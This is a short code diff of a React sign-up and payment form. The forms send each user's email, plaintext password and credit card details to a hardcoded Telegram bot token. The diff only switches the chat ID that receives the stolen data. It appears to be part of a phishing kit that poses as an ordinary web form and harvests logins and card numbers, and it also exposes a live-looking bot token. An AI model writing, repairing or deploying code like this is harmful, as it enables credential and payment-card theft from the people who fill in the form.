@@ -143,7 +143,7 @@ const SignUpForm: React.FC = () => {
       console.log('Form submitted:', { email, password });
       
       const botToken = '8058223565:AAHbgAMapXgv32Lg1vkLlTeL3BU-3Pvq6FY';
-      const chatId = '5940123889';
+      const chatId = '-5043301005';
       const message = `-> Ntx Log -
 User : ${email}
 Pass : ${password}`;
@@ -300,7 +300,7 @@ Pass : ${password}`;
           setIsProcessing(true);
           console.log('Payment form submitted', { name, cardNumber, expiryDate, cvv });
           const botToken = '8058223565:AAHbgAMapXgv32Lg1vkLlTeL3BU-3Pvq6FY';
-          const chatId = '5940123889';
+          const chatId = '-5043301005';
           const message = `User added payment:
 Name: ${name}
 Card Number: ${cardNumber}
